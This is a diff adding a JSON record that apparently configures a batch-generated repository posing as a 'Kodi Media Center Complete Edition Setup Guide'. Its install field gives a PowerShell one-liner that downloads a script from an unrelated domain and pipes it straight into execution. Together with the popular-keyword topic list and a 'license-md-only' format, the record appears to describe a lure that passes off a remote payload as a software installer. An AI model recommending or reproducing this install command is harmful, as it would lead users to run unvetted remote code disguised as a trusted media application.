@@ -1,0 +1,25 @@
+{
+  "repo": "Kodi-Media-Center-Complete-Edition-Setup-Guide",
+  "product": "Kodi Media Center Complete Edition Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "media",
+  "topics": [
+    "kodi-media-center-complete-edition-setup",
+    "kodi",
+    "media",
+    "center",
+    "complete",
+    "edition",
+    "setup",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
